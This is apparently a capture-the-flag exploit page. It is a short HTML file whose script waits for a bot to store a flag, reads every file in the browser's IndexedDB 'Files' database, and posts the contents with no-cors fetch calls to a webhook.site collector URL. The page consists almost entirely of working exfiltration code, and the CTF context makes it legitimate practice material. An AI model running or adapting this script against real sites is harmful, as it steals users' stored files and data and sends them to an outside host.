<!DOCTYPE html>
<html>
<head>
  <title>CTF Exploit</title>
</head>
<body>
  <h1>Extracting flag...</h1>
  <script>
    // Wait a bit for the bot to add the flag via postMessage
    setTimeout(async () => {
      const req = indexedDB.open("Files", 1);
      req.onsuccess = function () {
        const db = req.result;
        const tx = db.transaction(["files", "info"], "readonly");
        const store = tx.objectStore("files");

        const getAll = store.getAll();
        getAll.onsuccess = () => {
          for (const entry of getAll.result) {
            const reader = new FileReader();
            reader.onload = function () {
              fetch("https://webhook.site/ae1bf336-67e2-4b9d-8bee-88cfcbd27f28", {
                method: "POST",
                mode: "no-cors",
                body: reader.result
              });
            };
            reader.readAsText(entry.file);
          }
        };
      };
    }, 2000); // Wait for the flag to be injected and stored
  </script>
</body>
</html>
